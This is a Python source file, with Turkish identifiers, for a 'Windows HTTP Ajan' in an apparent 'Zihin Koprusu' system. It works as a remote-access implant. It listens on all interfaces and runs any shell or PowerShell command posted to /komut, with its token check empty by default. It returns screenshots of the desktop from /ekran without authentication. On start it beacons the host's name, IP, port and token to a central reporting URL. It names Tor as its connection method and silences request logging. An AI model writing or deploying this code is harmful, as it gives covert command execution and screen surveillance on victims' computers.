#!/usr/bin/env python3
"""
Zihin Koprusu HTTP Ajanı
Uzuv: Windows HTTP Ajan (windows_http_ajan)
Hedef: Windows HTTP Ajan
"""
import json
import os
import platform
import subprocess
import tempfile
import shutil
import socket
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

UZUV_ID = "windows_http_ajan"
UZUV_AD = "Windows HTTP Ajan"
HTTP_HOST = "0.0.0.0"
HTTP_PORT = 8787
HTTP_TOKEN = ""
SEMA = "http"
BILDIRIM_URL = ""
BAGLANTI_YONTEMI = "tor_http"

def _yerel_ip_bul() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return ""

def _hazir_bildir():
    if not BILDIRIM_URL:
        return
    try:
        veri = json.dumps({
            "olay": "hazir",
            "uzuv_id": UZUV_ID,
            "uzuv_ad": UZUV_AD,
            "host": socket.gethostname(),
            "ip": _yerel_ip_bul(),
            "http_port": HTTP_PORT,
            "http_token": HTTP_TOKEN,
            "baglanti_yontemi": BAGLANTI_YONTEMI,
            "tip": platform.system().lower() or "http",
            "zaman": time.strftime("%Y-%m-%d %H:%M:%S"),
        }).encode("utf-8")
        req = urllib.request.Request(
            BILDIRIM_URL.rstrip("/") + "/uzuv_bildir",
            data=veri,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=15)
        print("[ZK] Merkeze hazir bildirimi gonderildi.")
    except Exception as exc:
        print(f"[ZK] Hazir bildirimi gonderilemedi: {exc}")

def _yetki(headers) -> bool:
    if not HTTP_TOKEN:
        return True
    return headers.get("X-ZK-Token", "") == HTTP_TOKEN

def _komut_calistir(komut: str) -> tuple[int, str]:
    kabuk = komut
    if platform.system().lower().startswith("win"):
        kabuk = f'powershell -Command "{komut}"'
    try:
        r = subprocess.run(
            kabuk,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60,
            errors="replace",
        )
        cikti = (r.stdout + r.stderr).strip()
        return r.returncode, cikti or "Komut tamamlandi."
    except subprocess.TimeoutExpired:
        return 124, "Zaman asimi."
    except Exception as exc:
        return 500, f"Hata: {exc}"

def _ekran_goruntu_al() -> tuple[int, bytes, str]:
    if platform.system().lower().startswith("win"):
        fd, gecici = tempfile.mkstemp(prefix="zk_http_screen_", suffix=".png")
        os.close(fd)
        try:
            komut = (
                "Add-Type -AssemblyName System.Windows.Forms; "
                "Add-Type -AssemblyName System.Drawing; "
                "$bmp = New-Object System.Drawing.Bitmap "
                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, "
                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; "
                "$gfx = [System.Drawing.Graphics]::FromImage($bmp); "
                "$gfx.CopyFromScreen(0, 0, 0, 0, $bmp.Size); "
                "$bmp.Save('{gecici}', [System.Drawing.Imaging.ImageFormat]::Png); "
                "$gfx.Dispose(); $bmp.Dispose()"
            )
            r = subprocess.run(
                ["powershell", "-NoProfile", "-Command", komut],
                capture_output=True,
                timeout=30,
                text=True,
                errors="replace",
            )
            if r.returncode == 0 and os.path.exists(gecici) and os.path.getsize(gecici) > 0:
                with open(gecici, "rb") as f:
                    return 200, f.read(), "image/png"
        except Exception:
            pass
        finally:
            try:
                os.unlink(gecici)
            except OSError:
                pass

    adaylar = []
    if shutil.which("gnome-screenshot"):
        adaylar.append(["gnome-screenshot", "-f"])
    if shutil.which("scrot"):
        adaylar.append(["scrot"])
    if shutil.which("import"):
        adaylar.append(["import", "-window", "root"])
    if os.path.exists("/system/bin/screencap") or shutil.which("screencap"):
        adaylar.append(["screencap", "-p"])
    for taban in adaylar:
        fd, gecici = tempfile.mkstemp(prefix="zk_http_screen_", suffix=".png")
        os.close(fd)
        try:
            cmd = list(taban) + [gecici]
            r = subprocess.run(cmd, capture_output=True, timeout=30)
            if r.returncode == 0 and os.path.exists(gecici) and os.path.getsize(gecici) > 0:
                with open(gecici, "rb") as f:
                    return 200, f.read(), "image/png"
        except Exception:
            pass
        finally:
            try:
                os.unlink(gecici)
            except OSError:
                pass
    return 500, b"Ekran goruntusu alinamadi.", "text/plain; charset=utf-8"

class ZKAjan(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def _json(self, kod: int, veri: dict):
        icerik = json.dumps(veri, ensure_ascii=False).encode("utf-8")
        self.send_response(kod)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(icerik)))
        self.end_headers()
        self.wfile.write(icerik)

    def _raw(self, kod: int, icerik: bytes, tur: str):
        self.send_response(kod)
        self.send_header("Content-Type", tur)
        self.send_header("Content-Length", str(len(icerik)))
        self.end_headers()
        self.wfile.write(icerik)

    def do_GET(self):
        if self.path.rstrip("/") in ("", "/", "/health"):
            self._json(200, {
                "durum": "ok",
                "uzuv_id": UZUV_ID,
                "uzuv_ad": UZUV_AD,
                "platform": platform.platform(),
                "sema": SEMA,
                "ip": _yerel_ip_bul(),
                "http_port": HTTP_PORT,
            })
            return
        if self.path.rstrip("/") == "/ekran":
            kod, icerik, tur = _ekran_goruntu_al()
            self._raw(kod, icerik, tur)
            return
        self._json(404, {"durum": "hata", "mesaj": "Yol bulunamadi"})

    def do_POST(self):
        if not _yetki(self.headers):
            self._json(403, {"durum": "hata", "mesaj": "Yetkisiz"})
            return
        if self.path.rstrip("/") != "/komut":
            self._json(404, {"durum": "hata", "mesaj": "Yol bulunamadi"})
            return
        try:
            uzunluk = int(self.headers.get("Content-Length", "0"))
            ham = self.rfile.read(uzunluk).decode("utf-8") if uzunluk else "{}"
            veri = json.loads(ham or "{}")
            komut = (veri.get("komut") or "").strip()
            if not komut:
                self._json(400, {"durum": "hata", "mesaj": "Komut bos"})
                return
            kod, sonuc = _komut_calistir(komut)
            self._json(200, {
                "durum": "ok" if kod == 0 else "hata",
                "returncode": kod,
                "sonuc": sonuc,
                "uzuv_id": UZUV_ID,
            })
        except Exception as exc:
            self._json(500, {"durum": "hata", "mesaj": str(exc)})

def main():
    sunucu = ThreadingHTTPServer((HTTP_HOST, HTTP_PORT), ZKAjan)
    print(f"[ZK] HTTP ajan basladi: {HTTP_HOST}:{HTTP_PORT} | uzuv={UZUV_AD}")
    _hazir_bildir()
    sunucu.serve_forever()

if __name__ == "__main__":
    main()
